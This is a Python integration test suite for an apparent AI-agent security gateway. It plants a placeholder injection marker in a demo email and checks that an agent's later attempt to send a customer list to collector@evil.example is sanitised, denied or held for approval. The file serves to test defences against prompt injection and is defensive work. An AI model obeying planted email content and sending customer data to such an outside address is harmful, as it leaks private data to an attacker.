"""End-to-end integration with the real components: policy engine, taint tracker, detector, sanitiser,
audit, approvals, upstream manager (in-process demo MCP server) and the default Najd Trading policy.

No attack text is kept in the repository: the planted content is the neutral placeholder ``MARKER``,
which ``MarkerDetector`` (the real detector plus one stub rule) scores as an injection. Everything
downstream of the score (thresholds, sanitising, spotlighting, taint, replay) is the real code.
"""

from __future__ import annotations

import importlib
import json
import re
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

import httpx
import pytest

from mirsad.api import create_app
from mirsad.config import Settings


def _available(*modules: str) -> bool:
    try:
        for m in modules:
            importlib.import_module(m)
        return hasattr(importlib.import_module("mirsad.detector"), "InjectionDetector")
    except Exception:
        return False


pytestmark = pytest.mark.skipif(
    not _available("mirsad.policy", "mirsad.taint", "mirsad.detector", "mirsad.adapters.upstreams",
                   "demo.workspace_server"),
    reason="real modules of other areas not available yet")

ROOT = Path(__file__).resolve().parents[2]
PASSWORD = "integration-password-1"
MARKER = "SAMPLE-FLAGGED-TEXT"
# Placeholder planted into an e-mail; the address lets the taint layer see an untrusted destination.
PAYLOAD = f"{MARKER} (placeholder for planted content; contact collector@evil.example)."


class MarkerDetector:
    """The real ``InjectionDetector`` plus a stub rule that scores ``MARKER`` as an injection."""

    def __init__(self) -> None:
        from mirsad.detector import InjectionDetector

        self.real = InjectionDetector.default()
        self.version = getattr(self.real, "version", None)

    def scan(self, text: str) -> Any:
        from mirsad.models import DetectionSpan

        result = self.real.scan(text)
        spans = [DetectionSpan(start=m.start(), end=m.end(), text=m.group(), rule_id="test.placeholder")
                 for m in re.finditer(re.escape(MARKER), text)]
        if not spans:
            return result
        return result.model_copy(update={"score": max(result.score, 0.97), "label": "injection",
                                         "rule_score": 1.0, "spans": [*result.spans, *spans]})

    def scan_structured(self, value: Any) -> Any:
        dump = json.dumps(value, ensure_ascii=False, default=str)
        return self.scan(dump) if MARKER in dump else self.real.scan_structured(value)


@pytest.fixture
async def real(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> AsyncIterator[dict[str, Any]]:
    from demo.workspace_server import WORLD

    monkeypatch.delenv("MIRSAD_ADMIN_PASSWORD", raising=False)
    WORLD.reset()
    upstreams = tmp_path / "upstreams.yaml"
    upstreams.write_text("upstreams:\n  - name: workspace\n    transport: inprocess\n"
                         "    target: demo.workspace_server:server\n")
    settings = Settings(data_dir=tmp_path / "data", secret_key="integration-secret-0123456789abcdef",
                        policy_path=ROOT / "configs" / "policies" / "default.yaml", upstreams_path=upstreams,
                        approval_timeout_s=2.0)
    app = create_app(settings, gateway_overrides={"detector": MarkerDetector()}, static_dir=tmp_path / "none")
    comps = app.state.components
    comps.auth.create_user(comps.db, "admin1", PASSWORD, "admin")
    _info, key = comps.auth.create_agent(comps.db, "crm-agent", "CRM Agent", "email-crm-assistant")
    token = comps.auth.create_token("admin1", "admin", comps.secret, 1)
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t") as client:
            yield {"app": app, "client": client, "comps": comps, "world": WORLD,
                   "agent": {"Authorization": f"Bearer {key}"}, "admin": {"Authorization": f"Bearer {token}"}}
    WORLD.reset()


async def test_visible_tools_come_from_the_in_process_mcp_server(real):
    tools = (await real["client"].get("/v1/tools", headers=real["agent"])).json()
    names = {t["name"] for t in tools}
    assert {"list_emails", "read_email", "send_email", "transfer_funds"} <= names


async def test_poisoned_email_is_neutralised_and_exfiltration_is_stopped(real):
    c, agent, world = real["client"], real["agent"], real["world"]
    email_id = world.emails[0]["id"]
    world.plant("email", email_id, PAYLOAD)
    read = (await c.post("/v1/tools/read_email/invoke", headers=agent,
                         json={"session_id": "it-1", "arguments": {"email_id": email_id}})).json()
    assert read["decision"]["action"] == "allow"
    result = read["result"]
    assert result["detection"]["label"] == "injection" and result["action"] in ("sanitize", "block")
    assert MARKER not in result["content"] and MARKER not in json.dumps(result["structured"])

    exfil = (await c.post("/v1/guard/tool-call", headers=agent, json={
        "session_id": "it-1", "tool": "send_email", "wait": False,
        "arguments": {"to": "collector@evil.example", "subject": "list", "body": "customers"}})).json()
    assert exfil["action"] in ("deny", "require_approval")
    layers = {r["layer"] for r in exfil["reasons"] if r["action"] != "allow"}
    assert layers & {"policy", "taint"}
    # the raw (pre-sanitising) result was registered: the address came from untrusted content
    assert "TAINT_UNTRUSTED_DESTINATION" in {r["code"] for r in exfil["reasons"]}
    assert world.outbox == []

    # deterministic replay of that decision with the real engines
    replay = (await c.post(f"/api/audit/events/{exfil['audit_seq']}/replay", headers=real["admin"])).json()
    assert replay["match"] is True, json.dumps(replay)
    verify = (await c.post("/api/audit/verify", headers=real["admin"])).json()
    assert verify["ok"] is True


async def test_benign_internal_flow_is_allowed(real):
    c, agent = real["client"], real["agent"]
    listing = (await c.post("/v1/tools/list_emails/invoke", headers=agent,
                            json={"session_id": "it-2", "arguments": {"limit": 3}})).json()
    assert listing["decision"]["action"] == "allow" and listing["result"]["action"] in ("pass", "flag")
    sent = (await c.post("/v1/guard/tool-call", headers=agent, json={
        "session_id": "it-3", "tool": "send_email", "wait": False,
        "original_task": "Send the weekly summary to sales@najd-trading.example",
        "arguments": {"to": "sales@najd-trading.example", "subject": "Hi", "body": "Weekly summary attached."}})).json()
    assert sent["action"] == "allow", sent
    stats = (await c.get("/api/stats/overview", headers=real["admin"])).json()
    assert stats["total_calls"] >= 2 and stats["audit_ok"] is True


async def test_mcp_streamable_http_endpoint_on_the_real_app(tmp_path, monkeypatch):
    """An MCP client talks to /mcp on a live server; calls go through the full gateway pipeline."""
    import socket
    import threading
    import time

    import httpx2
    import uvicorn
    from demo.workspace_server import WORLD
    from mcp import Client
    from mcp.client.streamable_http import streamable_http_client

    monkeypatch.delenv("MIRSAD_ADMIN_PASSWORD", raising=False)
    WORLD.reset()
    upstreams = tmp_path / "upstreams.yaml"
    upstreams.write_text("upstreams:\n  - name: workspace\n    transport: inprocess\n"
                         "    target: demo.workspace_server:server\n")
    settings = Settings(data_dir=tmp_path / "data", secret_key="integration-secret-0123456789abcdef",
                        policy_path=ROOT / "configs" / "policies" / "default.yaml", upstreams_path=upstreams,
                        approval_timeout_s=1.0)
    app = create_app(settings, gateway_overrides={"detector": MarkerDetector()}, static_dir=tmp_path / "none")
    comps = app.state.components
    _info, key = comps.auth.create_agent(comps.db, "mcp-agent", "MCP Agent", "email-crm-assistant")
    email_id = WORLD.emails[0]["id"]
    WORLD.plant("email", email_id, PAYLOAD)

    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=port, log_level="warning"))
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    deadline = time.time() + 15
    while not server.started and time.time() < deadline:
        time.sleep(0.05)
    try:
        headers = {"Authorization": f"Bearer {key}", "X-Mirsad-Session": "mcp-it"}
        async with httpx2.AsyncClient(headers=headers, timeout=30) as http:
            async with Client(streamable_http_client(f"http://127.0.0.1:{port}/mcp", http_client=http)) as client:
                names = {t.name for t in (await client.list_tools()).tools}
                read = await client.call_tool("read_email", {"email_id": email_id})
                exfil = await client.call_tool("send_email", {"to": "collector@evil.example", "subject": "x",
                                                              "body": "customer list"})
        text = " ".join(getattr(b, "text", "") for b in read.content).lower()
        assert "send_email" in names and MARKER.lower() not in text
        assert exfil.is_error and WORLD.outbox == []
        decisions, _ = comps.audit.query(event_type="tool_call.decision", session_id="mcp-it")
        assert len(decisions) == 2 and {d.agent_id for d in decisions} == {"email-crm-assistant"}
    finally:
        server.should_exit = True
        thread.join(timeout=15)
        WORLD.reset()
